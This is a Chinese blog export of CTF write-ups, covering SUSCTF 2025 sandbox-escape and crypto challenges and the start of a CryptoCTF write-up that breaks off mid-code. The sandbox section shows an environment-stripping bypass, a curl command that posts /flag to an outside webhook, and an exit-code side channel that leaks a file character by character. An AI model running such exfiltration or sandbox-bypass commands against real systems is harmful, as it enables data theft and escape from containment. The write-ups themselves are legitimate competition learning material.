[{"title":"2025 SUSCTF题解","url":"/2025/10/09/2025%20SUSCTF%E9%A2%98%E8%A7%A3/","content":"前言又来打我们学校的比赛了，在一年的学习之后，感觉自己强了一点，不过主要是因为今年没什么研究生师傅一起竞技，原来去年才是特例啊。\n\n以及虽然没有很多研究生大佬，但是今年有新生大佬，很难想象大一新生也能排到榜里靠上的位置，我们这些前浪要被拍死在沙滩上了。\n正文misc我本是misc手，但是这团misc一点都不会。Questionnaire是比赛的问卷，跳过。\neasyjail##################main.pyimport subprocessimport osimport hashlibimport requestsROOT = &quot;/app&quot;TEST_SCRIPT_PATH = &quot;testscript.sh&quot;def hash_file(path):    h = hashlib.sha256()    with open(path, &quot;rb&quot;) as f:        while chunk := f.read(8192):            h.update(chunk)    return h.hexdigest()def snapshot_directory(*paths):    file_hashes = &#123;&#125;    for path in paths:        for root, dirs, files in os.walk(path):            for f in files:                full_path = os.path.join(root, f)                try:                    file_hashes[full_path] = hash_file(full_path)                except Exception:                    pass    return file_hashesdef fetch(url):    r = requests.get(url)    r.raise_for_status()    return r.textdef write_script_to_chroot(script_path, script_content):    content = &quot;readonly LD_PRELOAD\\n&quot; + script_content    script_file = os.path.join(ROOT, script_path)    with open(script_file, &quot;w&quot;) as f:        f.write(content)    os.chmod(script_file, 0o755)def run_bash_script_sandbox(script_path):    script_path = os.path.join(ROOT, script_path)    env = &#123;&quot;LD_PRELOAD&quot;: &quot;./override.so&quot;&#125;    sandbox_cmd = [&quot;bash&quot;, &quot;-re&quot;, script_path]    result = subprocess.run(sandbox_cmd, capture_output=True, text=True, env=env)    return resultdef main():    url = input(&quot;Your script: &quot;)    s = fetch(url)    write_script_to_chroot(TEST_SCRIPT_PATH, s)    # Snapshot root filesystem before running script    root_snapshot_before = snapshot_directory(ROOT, &quot;/tmp&quot;, &quot;/dev/shm&quot;)    # Run script sandboxed    result = run_bash_script_sandbox(TEST_SCRIPT_PATH)    print(&quot;Script stdout:&quot;, result.stdout)    print(&quot;Script stderr:&quot;, result.stderr)    print(&quot;Exit code:&quot;, result.returncode)    if result.returncode != 0:        print(&quot;Ah-oh exit code. You fail!&quot;)        exit(1)    # Snapshot root filesystem after running script    root_snapshot_after = snapshot_directory(ROOT, &quot;/tmp&quot;, &quot;/dev/shm&quot;)    # Compare snapshots for any changes    changed_files = []    for fpath, hsh in root_snapshot_before.items():        if fpath in root_snapshot_after:            if root_snapshot_after[fpath] != hsh:                changed_files.append(fpath)        else:            changed_files.append(fpath + &quot; (deleted)&quot;)    new_files = [f for f in root_snapshot_after if f not in root_snapshot_before]    if not changed_files and not new_files:        print(&quot;No disk files were modified by the script. Good!&quot;)    else:        print(f&quot;Files changed: &#123;changed_files&#125;&quot;)        print(f&quot;New files: &#123;new_files&#125;&quot;)        print(&quot;Some disk files were modified. You fail.&quot;)        exit(1)if __name__ == &quot;__main__&quot;:    main()\n##################override.c#define _POSIX_C_SOURCE 200809L#include &lt;arpa/inet.h&gt;#include &lt;dlfcn.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;linux/openat2.h&gt;#include &lt;netinet/in.h&gt;#include &lt;stdarg.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/types.h&gt;typedef int (*open_func_t)(const char *, int, ...);typedef int (*openat_func_t)(int, const char *, int, ...);typedef int (*openat2_func_t)(int, const char *, struct open_how *, size_t);typedef int (*io_uring_setup_t)(unsigned int, void *);typedef int (*io_uring_enter_t)(unsigned int, unsigned int, unsigned int,                                unsigned int, void *);typedef int (*connect_func_t)(int, const struct sockaddr *, socklen_t);int open(const char *pathname, int flags, ...) &#123;  static open_func_t real_open = NULL;  if (!real_open) &#123;    real_open = (open_func_t)dlsym(RTLD_NEXT, &quot;open&quot;);  &#125;  if (pathname &amp;&amp; strstr(pathname, &quot;flag&quot;) != NULL) &#123;    errno = EPERM;    return -1;  &#125;  if ((flags &amp; O_PATH) == O_PATH) &#123;    errno = EPERM;    return -1;  &#125;  mode_t mode = 0;  if (flags &amp; O_CREAT) &#123;    va_list args;    va_start(args, flags);    mode = va_arg(args, mode_t);    va_end(args);    return real_open(pathname, flags, mode);  &#125;  return real_open(pathname, flags);&#125;int openat(int dirfd, const char *pathname, int flags, ...) &#123;  static openat_func_t real_openat = NULL;  if (!real_openat) &#123;    real_openat = (openat_func_t)dlsym(RTLD_NEXT, &quot;openat&quot;);  &#125;  if (pathname &amp;&amp; strstr(pathname, &quot;flag&quot;) != NULL) &#123;    errno = EPERM;    return -1;  &#125;  if ((flags &amp; O_PATH) == O_PATH) &#123;    errno = EPERM;    return -1;  &#125;  mode_t mode = 0;  if (flags &amp; O_CREAT) &#123;    va_list args;    va_start(args, flags);    mode = va_arg(args, mode_t);    va_end(args);    return real_openat(dirfd, pathname, flags, mode);  &#125;  return real_openat(dirfd, pathname, flags);&#125;int openat2(int dirfd, const char *pathname, struct open_how *how,            size_t size) &#123;  typedef int (*openat2_func_t)(int, const char *, struct open_how *, size_t);  static openat2_func_t real_openat2 = NULL;  if (!real_openat2) &#123;    real_openat2 = (openat2_func_t)dlsym(RTLD_NEXT, &quot;openat2&quot;);  &#125;  if (pathname &amp;&amp; strstr(pathname, &quot;flag&quot;) != NULL) &#123;    errno = EPERM;    return -1;  &#125;  if ((how-&gt;flags &amp; O_PATH) == O_PATH) &#123;    errno = EPERM;    return -1;  &#125;  return real_openat2(dirfd, pathname, how, size);&#125;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) &#123;  static connect_func_t real_connect = NULL;  if (!real_connect) &#123;    real_connect = (connect_func_t)dlsym(RTLD_NEXT, &quot;connect&quot;);  &#125;  if (addr-&gt;sa_family == AF_INET &amp;&amp; addrlen &gt;= sizeof(struct sockaddr_in)) &#123;    struct sockaddr_in new_addr = *(struct sockaddr_in *)addr;    new_addr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);    return real_connect(sockfd, (struct sockaddr *)&amp;new_addr, addrlen);  &#125;  errno = EAFNOSUPPORT;  return -1;&#125;int io_uring_setup(unsigned int entries, void *params) &#123;  errno = EPERM;  return -1;&#125;int io_uring_enter(unsigned int fd, unsigned int to_submit,                   unsigned int min_complete, unsigned int flags, void *sig) &#123;  errno = EPERM;  return -1;&#125;\n##################run.sh#!/bin/shif [ -z &quot;$GZCTF_FLAG&quot; ]; then    export GZCTF_FLAG=&quot;susctf&#123;testflag&#125;&quot;fiecho &quot;$GZCTF_FLAG&quot; &gt;/flagexport GZCTF_FLAG=&quot;&quot;echo &quot;Blocked by ctf_xinetd&quot; &gt;/etc/banner_failchmod 444 /flaginetd -fsleep infinity\nmain.py是主要的交互部分，它从我们输入的url上获取脚本，在一个有限制的沙箱中运行，并给出输出流、错误流和退出代码。最后检查根目录、/tmp和/dev/shm下有没有文件被改变，并告知用户。\n沙箱中调整了open，openat和openat2，打开的文件名不能包含”flag”，标志flag中不能包含O_PATH位，因此无法读取根目录的/flag文件，也不能获取文件描述符。同时，沙箱控制了所有的网络连接，对于ipv4，将目标地址强制设置为127.0.0.1；对于非ipv4的连接，则直接报错，因此不能够利用网络向外传输信息。最后，它禁用了io_uring，不能使用这个I/O接口。\n不过幸运的是，subprocess.run(sandbox_cmd, capture_output=True, text=True, env=env)表明对于沙箱的限制都写在env环境变量中，因此我们可以执行一个不包含这个环境变量的进程，在新的进程中读取flag。\n实际代码如下：env -i cat /flag 。其中-i参数表示忽略环境变量，因此可以执行cat /flag。将脚本存储在可被服务器读取的地方（如pastebin.com），并让服务器执行即可。\n\ncurlbashimport subprocessimport osimport hashlibimport requestsROOT = &quot;/app&quot;TEST_SCRIPT_PATH = &quot;testscript.sh&quot;CURLBASH = &quot;&quot;&quot;#!/bin/bashcurl -fsSL &#123;url&#125; | bash -re&quot;&quot;&quot;def hash_file(path):    h = hashlib.sha256()    with open(path, &quot;rb&quot;) as f:        while chunk := f.read(8192):            h.update(chunk)    return h.hexdigest()def snapshot_directory(*paths):    file_hashes = &#123;&#125;    for path in paths:        for root, dirs, files in os.walk(path):            for f in files:                full_path = os.path.join(root, f)                try:                    file_hashes[full_path] = hash_file(full_path)                except Exception:                    pass    return file_hashesdef fetch(url):    result = requests.get(url)    result.raise_for_status()    return result.textdef fetch_with_curl(url):    result = subprocess.run([&quot;curl&quot;, &quot;-fsSL&quot;, url], capture_output=True, text=True)    if result.returncode != 0:        print(&quot;Failed to download script!&quot;)        exit(1)    return result.stdoutdef write_script_to_chroot(script_path, script_content):    content = &quot;readonly LD_PRELOAD\\n&quot; + script_content    script_file = os.path.join(ROOT, script_path)    with open(script_file, &quot;w&quot;) as f:        f.write(content)    os.chmod(script_file, 0o755)def run_bash_script(script_path, sandbox=True):    script_path = os.path.join(ROOT, script_path)    sandbox_cmd = [&quot;/bin/bash&quot;, &quot;-re&quot;, script_path]    if sandbox:        # qemu-x86_64 is a safe sandbox with isolated network &amp; filesystem        # try locally with &quot;unshare -n&quot;        sandbox_cmd.insert(0, &quot;qemu-x86_64&quot;)    result = subprocess.run(sandbox_cmd, capture_output=True, text=True)    # print(&quot;Script stdout:&quot;, result.stdout)    # print(&quot;Script stderr:&quot;, result.stderr)    print(&quot;Exit code:&quot;, result.returncode)    if result.returncode != 0:        print(&quot;Ah-oh exit code. You fail!&quot;)        exit(1)def run_sandboxed(url):    # fetch first    s = fetch_with_curl(url)    if s != fetch(url):        print(&quot;WTH did you give me?&quot;)        exit(1)    write_script_to_chroot(TEST_SCRIPT_PATH, s)    # Snapshot root filesystem before running script    root_snapshot_before = snapshot_directory(ROOT, &quot;/tmp&quot;, &quot;/dev/shm&quot;)    # Run script sandboxed    run_bash_script(TEST_SCRIPT_PATH)    # Snapshot root filesystem after running script    root_snapshot_after = snapshot_directory(ROOT, &quot;/tmp&quot;, &quot;/dev/shm&quot;)    # Compare snapshots for any changes    changed_files = []    for fpath, hsh in root_snapshot_before.items():        if fpath in root_snapshot_after:            if root_snapshot_after[fpath] != hsh:                changed_files.append(fpath)        else:            changed_files.append(fpath + &quot; (deleted)&quot;)    new_files = [f for f in root_snapshot_after if f not in root_snapshot_before]    if not changed_files and not new_files:        print(&quot;No disk files were modified by the script. Good!&quot;)    else:        print(f&quot;Files changed: &#123;changed_files&#125;&quot;)        print(f&quot;New files: &#123;new_files&#125;&quot;)        print(&quot;Some disk files were modified. You fail.&quot;)        exit(1)def run_curlbash(url):    write_script_to_chroot(TEST_SCRIPT_PATH, CURLBASH.format(url=url))    run_bash_script(TEST_SCRIPT_PATH, sandbox=False)def main():    url = input(&quot;Your script: &quot;)    # Run random times in sandbox (to make sure you are not spoofing)    random_index = int.from_bytes(os.urandom(1), &quot;big&quot;) % 32    for i in range(random_index):        print(f&quot;[Round &#123;i&#125;]&quot;, end=&quot; &quot;)        run_sandboxed(url)    # Since the content is safe, do it in curlbash this time    print(f&quot;[Round &#123;random_index&#125; CURLBASH]&quot;, end=&quot; &quot;)    run_curlbash(url)if __name__ == &quot;__main__&quot;:    main()\n与上一题类似，但是这个环境绕不过了，一定会先在qemu中运行若干个回合，才会在宿主机运行一回。同时，没有输出流和错误流，只保留了退出代码的输出，因此，虽然cat /flag可以直接运行了，但是得不到输出，没有用。\n这题被我发现了漏洞，实现了一个非预期。至于预期解，出题人说这题废了，没有预期解，所以revenge里面我也只能提供我的解法。\n第一步，程序先检测curl获取的脚本和request获取的是否一致，如果不一致则直接报错。考虑到request库和curl实现上的差异，建议将脚本编成一行。\n第二步，由于回显只有退出代码，必须采用其他方式输出，如果考虑使用网络传输，qemu没有网，必须由宿主机执行命令，而在qemu应当绕过。\n因此，我们利用webhook.site接收服务器回传的flag，并使用||exit 0绕过qemu的报错。完整脚本如下：curl -X POST --data &quot;$(cat /flag)&quot; &quot;https://webhook.site/your_address&quot; || exit 0\n同样上传到pastebin，发送至服务器即可通过每一轮qemu中的验证，让宿主机发出flag。\ncurlbash-revenge在和出题人交流过后他们成功根据我的思路部署了反制措施，现在使用||exit 0不顶用了。但是退出代码还是可以控制的，尝试了exit 1和exit 123456等多轮测试后，发现退出代码可以是0-255，在exit 256时就会回到exit 0。这个范围足够大，可以覆盖所有可打印字符，因此我们利用退出代码进行回显，不断请求服务器，让其给出flag的每一位。\nif test -f /flag; then char=$(cut -c 57 /flag); case &quot;$char&quot; in &#x27;&#x27;) exit 0;; &#x27;a&#x27;) exit 10;; &#x27;b&#x27;) exit 11;; &#x27;c&#x27;) exit 12;; &#x27;d&#x27;) exit 13;; &#x27;e&#x27;) exit 14;; &#x27;f&#x27;) exit 15;; &#x27;g&#x27;) exit 16;; &#x27;h&#x27;) exit 17;; &#x27;i&#x27;) exit 18;; &#x27;j&#x27;) exit 19;; &#x27;k&#x27;) exit 20;; &#x27;l&#x27;) exit 21;; &#x27;m&#x27;) exit 22;; &#x27;n&#x27;) exit 23;; &#x27;o&#x27;) exit 24;; &#x27;p&#x27;) exit 25;; &#x27;q&#x27;) exit 26;; &#x27;r&#x27;) exit 27;; &#x27;s&#x27;) exit 28;; &#x27;t&#x27;) exit 29;; &#x27;u&#x27;) exit 30;; &#x27;v&#x27;) exit 31;; &#x27;w&#x27;) exit 32;; &#x27;x&#x27;) exit 33;; &#x27;y&#x27;) exit 34;; &#x27;z&#x27;) exit 35;; &#x27;A&#x27;) exit 36;; &#x27;B&#x27;) exit 37;; &#x27;C&#x27;) exit 38;; &#x27;D&#x27;) exit 39;; &#x27;E&#x27;) exit 40;; &#x27;F&#x27;) exit 41;; &#x27;G&#x27;) exit 42;; &#x27;H&#x27;) exit 43;; &#x27;I&#x27;) exit 44;; &#x27;J&#x27;) exit 45;; &#x27;K&#x27;) exit 46;; &#x27;L&#x27;) exit 47;; &#x27;M&#x27;) exit 48;; &#x27;N&#x27;) exit 49;; &#x27;O&#x27;) exit 50;; &#x27;P&#x27;) exit 51;; &#x27;Q&#x27;) exit 52;; &#x27;R&#x27;) exit 53;; &#x27;S&#x27;) exit 54;; &#x27;T&#x27;) exit 55;; &#x27;U&#x27;) exit 56;; &#x27;V&#x27;) exit 57;; &#x27;W&#x27;) exit 58;; &#x27;X&#x27;) exit 59;; &#x27;Y&#x27;) exit 60;; &#x27;Z&#x27;) exit 61;; &#x27;0&#x27;) exit 62;; &#x27;1&#x27;) exit 63;; &#x27;2&#x27;) exit 64;; &#x27;3&#x27;) exit 65;; &#x27;4&#x27;) exit 66;; &#x27;5&#x27;) exit 67;; &#x27;6&#x27;) exit 68;; &#x27;7&#x27;) exit 69;; &#x27;8&#x27;) exit 70;; &#x27;9&#x27;) exit 71;; &#x27;_&#x27;) exit 72;; &#x27;-&#x27;) exit 73;; &#x27;+&#x27;) exit 74;; &#x27;=&#x27;) exit 75;; &#x27;&#123;&#x27;) exit 76;; &#x27;&#125;&#x27;) exit 77;; &#x27;[&#x27;) exit 78;; &#x27;]&#x27;) exit 79;; &#x27;(&#x27;) exit 80;; &#x27;)&#x27;) exit 81;; &#x27;*&#x27;) exit 82;; &#x27;&amp;&#x27;) exit 83;; &#x27;^&#x27;) exit 84;; &#x27;%&#x27;) exit 85;; &#x27;$&#x27;) exit 86;; &#x27;#&#x27;) exit 87;; &#x27;@&#x27;) exit 88;; &#x27;!&#x27;) exit 89;; &#x27;~&#x27;) exit 90;; &#x27;|&#x27;) exit 91;; &#x27;:&#x27;) exit 92;; &#x27;;&#x27;) exit 93;; &#x27;,&#x27;) exit 94;; &#x27;.&#x27;) exit 95;; &#x27;/&#x27;) exit 96;; &#x27;&lt;&#x27;) exit 97;; &#x27;&gt;&#x27;) exit 98;; &#x27;?&#x27;) exit 99;; &#x27;\\&#x27;) exit 100;; &quot;&#x27;&quot;) exit 101;; &#x27;&quot;&#x27;) exit 102;; *) exit 3;; esac; fi\n为了防止qemu中没有/flag导致代码不能工作，最前面有if语句进行排除。代码主要通过cut -c xx /flag部分提取出/flag的每一位，并与所有可打印字符进行比对，根据错误码得到对应位置的信息。\n以及非常难过的是，qemu中也有/flag，但是内容是susctf&#123;fake_flag&#125;，为了避免读到qemu中的文件就报错，需要将每一位对应的exit xx修改为0。由于原始代码没有返回0的分支，这个临时的0不会和其他字符混淆。经过勤劳的遍历，flag一共有57位，不得不说这个方法还是有些低效的。\n赛后与其他师傅交流，其实上面发送flag的思路也可以继续用，laboon师傅提出可以让代码判断自身在qemu运行还是在宿主机运行，在宿主机运行才发送，这样比我此前简单地|| exit 0应该更健壮，受益匪浅。\n\n（此处为最后一位，返回代码77对应的是’}’）\neat-mian又是一个OJ啊啊啊啊，去年仅1解的OJ (Orange Juice)还历历在目，今年框架都没变，于是致敬一下去年的正解——\n\n但是今年的我(AI)早就不是去年的我(AI)了，直接把题目描述丢给Gemini，它就会告诉我，在预编译阶段，有一个“符号连接”的操作符##，可以绕开不允许出现int和main的限制。\n\n将变化后的代码用#define变回去就可以得到flag了——我们仍未知道flag被存放在了哪里。\nsignin签到题，大概是我们海报的原稿，加了点东西就是misc题了，题就是这么好出（×）\n\n在一堆灰白的字中有一个susctf开头的透明字，鼠标扒拉扒拉就能看到了，唯一难点应该是.ai文件和人工智能没关系（）它是Adobe Illustrator的文件格式。美工人狂喜，电脑里本来就有AI\nCrypto01-All U Need附件经过一些修改，原始flag包含选手信息。\nn=2941187500626100000000000000000096722058862370000000000000000001044274909577110000000000000000015573575404024600000000000000000171146406712341000000000000000001930245944570620000000000000000025760100923677100000000000000000277371363421722000000000000000003054750478471270000000000000000035899269818100000000000000000000349504486312827000000000000000004416107975113120000000000000000045159437561331900000000000000000478278579950862000000000000000005201068719280110000000000000000055395991229465600000000000000000575427264362311000000000000000006513899157891840000000000000000068138580040670900000000000000000700010100085102000000000000000007449678280649610000000000000000076179301616911000000000000000000848825344827111000000000000000009147528156886200000000000000000096916670048442100000000000000001012695491123924000000000000000010191376824152950000000000000000101921523818312200000000000000001090906528164867000000000000000010818660687278780000000000000000114494912265499100000000000000001164939172364714000000000000000012240810178674610000000000000000116157458128710400000000000000001133872977471815000000000000000010558262104734340000000000000000103419184748331500000000000000001044264742306912000000000000000010186125008047950000000000000000095524362764015000000000000000000925195844257991000000000000000008524721514180660000000000000000084244161241166500000000000000000830468755024986000000000000000007624760085725490000000000000000076981945972714200000000000000000747851012643443000000000000000006794764467668420000000000000000062532460088466500000000000000000579998461987310000000000000000005544771313728490000000000000000050476404913277600000000000000000526223490724127000000000000000004716072135866840000000000000000044222349447237500000000000000000388984855995114000000000000000002999863906983770000000000000000021959129120257200000000000000000237144904003813000000000000000001758831932677180000000000000000018600782750857900000000000000000139537141588822000000000000000001041336657419230000000000000000008113148344575000000000000000000043849510632891e=2906394483919609876718245053652108240802816443654616570596682960056808336790951023665436900644365903659469395107610861811395487908359598931024764867783668598175618146070568166725395945846336528660593938878088074175368940125303446833806253827725576660603146160007926077633080070185804184370653460670499542474209926140850959830662928147081534504640452680743596927639143202106763011511633450412304911872611149284691203494590753332817447973304563995049156481955538016229735794657638604187642026395729393683809232249697844705933283010120794860594266302003916077635513753570820267039903372227762924194963229903775950600612826173365742947144845754327033303700968593908029325991574729319864162867114383090257406360462274758239372652598322110514768234833067030343517976067981681173246285960999251392023910101008419622061741537702746089074868280716357218504600102619616790459363850662290927928570978665465006400532967886379285182577029c=1708213808068669848519826329885073627495533453771869355404236766776976394875600223610783320567843904394004757667171577818696157078154624161633229435567938227621400120472675561293045909000944575370780097229718602544483465333666456760269964789286313135391462539002824762818324908740434625041936203485382749940324270673611565345523540650559660989192213866377320620831444966082327074466583737431225180641740057998396896846046673913517479419135612568716224770808828888906362438298621424388281533409977209988193102976575808229257044693055348919128559827922338648414991158681367641706339048291423325378335492415466975056798211861758497378651662962047790603102900289389259796781372937680635288921373314152124296063122272701717790918463732280614576619934450854124314001253332623488969893500781582839389615102352320041110387155669161856958516109101850490158163525849246236024906917296304659388149195414246756141632392625234635394041396980680763148948771350670502244761517964388823729212874251968209920216959651969549579132629268858126925845308413625334277824960235116249054166952095623611848302611889367035860562962643196041421748894123866634336996966288157815267340295191377699762091156917461609683315733487814916622973352213519822135782284689762300924900864573961224821387776681313885216314800754692676235827357177511902140315516613600111252370237320348161397957670675370032248892998778630549099756745429161879063996832843383020028539845993531049492695454183779573266339256000656432411113395979718943208584219397521922563351913950813071421626141628908123829996384197531302508378966736944721839826302697005782411113208262762492504367268638736619236665264350627452596161028559765617953879456992220581663155901170257921247758709291601565666075575768178180584488267914359254584703991253088308795031359138755906049847469389474409998815141738250581414922186134895948518471001547925118043356064982230110770503569329171147069066657423847555711017101977915247531968016285316966447336794828809253870994424009547764760792599716441650970657567279630440798896408067476055603626872676\n好久没见到这种又短又长的题了，信息很少又很长，尤其是这个n，实在是很难不在意啊。\n但是题解就很难写了，因为只能是“注意到”起手……n由小数字和一些0交替，因此可以试着将n转化为一个多项式f，把分解n的问题转化为分解多项式。经过观察，从最低位开始，每32个数字为一组，刚好可以让所有小数字都落在低位。\n2941187500626100000000000000000096722058862370000000000000000001044274909577110000000000000000015573575404024600000000000000000171146406712341000000000000000001930245944570620000000000000000025760100923677100000000000000000277371363421722000000000000000003054750478471270000000000000000035899269818100000000000000000000349504486312827......先强行将所有0放在高位\n294118750062610000000000000000009672205886237000000000000000000104427490957711000000000000000001557357540402460000000000000000017114640671234100000000000000000193024594457062000000000000000002576010092367710000000000000000027737136342172200000000000000000305475047847127000000000000000003589926981810000000000000000000034950448631282700000000000000000441610797511312......就会发现稍微调整一下，会很整齐\n这样，我们就得到了所有的小系数。由于数字是32位一组，因此多项式$f(x) = 29411875006261x^{64}+96722058862370x^{63}+…$，$n = f(10^{32})$。\n我们试着分解$f(x)$。由于我的sagemath临时罢工了，用Mathematica代替一下，代码当然还是Gemini写的。\n(*---步骤 1:定义多项式的系数---*)(*根据您提供的数据，从最高次项 (x^64) 到常数项 (x^0) 的顺序*)coeffs = &#123;29411875006261, 96722058862370, 104427490957711,  155735754040246, 171146406712341, 193024594457062, 257601009236771, 277371363421722, 305475047847127, 358992698181000, 349504486312827, 441610797511312, 451594375613319, 478278579950862, 520106871928011, 553959912294656, 575427264362311, 651389915789184, 681385800406709, 700010100085102, 744967828064961, 761793016169110, 848825344827111, 914752815688620, 969166700484421, 1012695491123924, 1019137682415295, 1019215238183122, 1090906528164867, 1081866068727878, 1144949122654991, 1164939172364714, 1224081017867461, 1161574581287104, 1133872977471815, 1055826210473434, 1034191847483315, 1044264742306912, 1018612500804795, 955243627640150, 925195844257991, 852472151418066, 842441612411665, 830468755024986, 762476008572549, 769819459727142, 747851012643443, 679476446766842, 625324600884665, 579998461987310, 554477131372849, 504764049132776, 526223490724127, 471607213586684, 442223494472375, 388984855995114, 299986390698377, 219591291202572, 237144904003813, 175883193267718, 186007827508579, 139537141588822, 104133665741923, 81131483445750, 43849510632891&#125;;(*---步骤 2:从系数构建多项式---*)(*使用 FromDigits 函数，这是一种非常高效且优雅的方式*)(*P[x] 代表我们的多项式*)P[x_] := FromDigits[coeffs, x];(*---步骤 3:尝试对多项式进行因式分解---*)(*Factor[] 是 Mathematica 中用于因式分解的核心函数*)(*我们使用 Timing[] 来测量计算所需的时间*)Print[&quot;正在尝试分解多项式...&quot;];result = Timing[Factor[P[x]]];(*---步骤 4:显示结果---*)Print[&quot;计算耗时: &quot;, result[[1]], &quot; 秒&quot;];Print[&quot;分解结果:&quot;];result[[2]]####################################################分解结果：(6406713 + 9553797 x + 5845799 x^2 + 4190775 x^3 + 7190749 x^4 +    2115569 x^5 + 8795931 x^6 + 4833343 x^7 + 6591197 x^8 +    8995631 x^9 + 9256951 x^10 + 5850379 x^11 + 7268673 x^12 +    4965579 x^13 + 9424191 x^14 + 6285533 x^15 + 6849663 x^16 +    4159993 x^17 + 7073919 x^18 + 6515847 x^19 + 3318105 x^20 +    8434387 x^21 + 3595731 x^22 + 5727693 x^23 + 3780489 x^24 +    3377355 x^25 + 6632605 x^26 + 4820231 x^27 + 5152863 x^28 +    6497639 x^29 + 2353095 x^30 + 7461845 x^31 +    2997863 x^32) (6844307 + 2457167 x + 6344587 x^2 + 5599625 x^3 +    5604721 x^4 + 4817655 x^5 + 3724917 x^6 + 3741569 x^7 +    8948705 x^8 + 9649919 x^9 + 6464695 x^10 + 8570943 x^11 +    4311675 x^12 + 3772115 x^13 + 2850975 x^14 + 5503773 x^15 +    6502209 x^16 + 4529349 x^17 + 9430051 x^18 + 2652377 x^19 +    7055707 x^20 + 6603971 x^21 + 5023657 x^22 + 4761113 x^23 +    9674989 x^24 + 7834229 x^25 + 9056537 x^26 + 5921159 x^27 +    3346885 x^28 + 5586621 x^29 + 7609767 x^30 + 7843685 x^31 +    9810947 x^32)\n我们成功得到了两个多项式$f_1(x)$和$f_2(x)$，好巧不巧，$f_1(10^{32})$和$f_2(10^{32})$都是质数，因此我们分解了n，解密即可。\n03-CrySignin","categories":["笔记"],"tags":["SUSCTF","Writeup","2025"]},{"title":"CryptoCTF 题解","url":"/2025/07/15/2025%20CryptoCTF%E9%A2%98%E8%A7%A3/","content":"前言最近正值暑假，闲着也是闲着，于是来玩玩吧。我发现自己真的很弱小，这些赛题的分值与解出的队伍数量成反比，将所有的题目按照最终分值排序，我恰好完成了分值最少的四道。加上事后补的两道，共完成了分值最少的六道。\n——就是说难的一道都不会（躺）\n正文既然都这样了，那干脆就按照最终题目分数升序写题解吧，按理来说，越前面的越简单。\n1.Vinad观察代码，我们得到了pubkey的第1和第2项，即R和p*q，和加密后的c。若要解出原文，需要得到p或者q，以及e。在genkey()函数中，q是随机生成的512位质数，p和e都与函数vinad()有关，我们自然想知道，vinad()在做什么。对于给定的列表R，vinad()取出每一个元素r，将其与x异或，返回异或后的&#39;1&#39;的个数的奇偶，奇数为1，偶数为0。将所有的r如此操作，结果拼成的字符串就是返回值的二进制形式。假设其中某两次取出的元素为$r_1$和$r_2$，那么，记$x \\oplus r_1 = k_1$，$x \\oplus r_2 = k_2$，则$k_1 \\oplus k_2 = \\text{XOR}(x,r_1,x,r_2)$。而$x \\oplus x = 0$，对结果没有影响，所以$k_1 \\oplus k_2 = r_1 \\oplus r_2$。其中$\\oplus$符号和$\\text{XOR}$均表示异或。这样一来，虽然x是一个很大的未知数，但任意两个结果的异或值都已经能从R中知晓，换言之，只要知道了其中一个结果(0或者1)，就知道了全部的结果。x实际上和只能取0/1没有区别。所以，我们取x=0，得到Q = int(&#39;&#39;.join(str(parinad(R[i])) for i in range(512)), 2)，得到p的一个候选值；如果n%Q!=0，即Q不正确，那么，将每一位取反，就是另一个候选值Q_alt。经过验证，可以得到p和q。\n对于e，我们已经分析得到vinad()函数在R给定的情况下只有两种可能的结果，用Q和Q_alt试两次就可以。\n#Crypto CTF https://cr.yp.toc.tf/ vinad题解from Crypto.Util.number import *R = [] #R太占版面了，就删掉了。题目附件里已经给出n = 58113574203067314600162910771848744432179168354040678920098167335472534222998261639291145191568159464990603689062679467360303185717662426122140998218656632568172511390111887830539687208220100574329903748617343193392646019854280519859403817579746765861359633174218846216669659258251676438195667516224684805919c = 56754194307199340085459028397027924827853574000671575387226403396873568994756738512141122143372650573201079937375922460851170745485734799044781029943783218210457587599666501326645229924138230588050782907693019958930006807017898115655426823272342984109999519420817119999272583495848119171867835187241510764427def parinad(n):    return bin(n)[2:].count(&#x27;1&#x27;) % 2# 1. 求出p和qQ = int(&#x27;&#x27;.join(str(parinad(R[i])) for i in range(512)), 2)Q_alt = (1&lt;&lt;512) - 1 - Qif n % Q == 0 and isPrime(Q):    p = Qelse:    p = Q_alt#print(p)assert isPrime(p) and n%p==0#print(sum(R))e = Q_altq = n//p# 2. 计算欧拉函数 φ(n)phi_n = (q - 1)*(p - 1)#print(&quot;phi = &quot;,phi_n)# 3. 计算 d (e 的模 φ(n) 的乘法逆元)d = inverse(e, phi_n)#print(&quot;d = &quot;,d)# 4. 解密消息 mm = pow(c, d, n)  # 快速模幂运算print(&quot;解密后的消息 m 为:&quot;, long_to_bytes(m - sum(R)))#CCTF&#123;s0lV1n9_4_Syst3m_0f_L1n3Ar_3qUaTi0n5_0vEr_7H3_F!3lD_F(2)!&#125;#本题由ChatGPT提供思路与代码\n2.Interpol观察代码，randpos()函数在0和1之间选一个数。如果选1，返回True和一个有两个数的元组，这两个数和flag相关；如果选0，返回False和另外一个元组，这个元组的两个数是一个随机整数和一个随机的有理数。接下来是while(True)部分：先得到一个randpos()的结果，如果返回True，那么n自增1，否则n不增加。但无论如何，DATA都会将新生成的元组加入，例外情况是_d[0][0]在H中，即元组的第一个数在H中。接下来使用拉格朗日插值，将以上元组表示的点变为一个有理数域的函数，我们最后得到了这个函数。因此，函数上的点就包含了flag上的点，根据randpos()函数我们可以发现，由flag得到的点，其横坐标一定是负数，纵坐标一定是整数，而随机点的横坐标大于等于0，纵坐标也是两个质数之比，不会是整数。我们据此得到所有满足x&lt;0的整点，就是由flag得到的点。对于点(-x,y)，我们有x = 1 + (19*n - 14) % len(flag)，y = ord(flag[(63 * n - 40) % len(flag)])。（n&lt;len(flag)）即：$n = (x + 13) \\times \\text{inverse}(19)\\space \\bmod \\text{len(flag)}$，$\\text{chr}(y) = \\text{flag}[(63 \\times n - 40)\\space \\bmod \\text{len(flag)}]$。于是可以根据每个x得到对应的n，进而得到flag中每个字符的位置。这里假设len(flag)和19，和63均互质，否则，flag不唯一。\n#Crypto CTF https://cr.yp.toc.tf/ Interpol题解#!/usr/bin/env sage# 从 output.raw 加载序列化多项式with open(&#x27;output.raw&#x27;, &#x27;rb&#x27;) as f:    poly_str = f.read()# 反序列化多项式P = loads(poly_str)# 定义多项式函数 p(x)p = P# 步骤1: 收集候选真点 (x, y)，其中 x 为负整数，p(x) 为整数points = []x_val = -1consecutive_non_integer = 0threshold = 20  # 连续非整数阈值，用于停止迭代while consecutive_non_integer &lt; 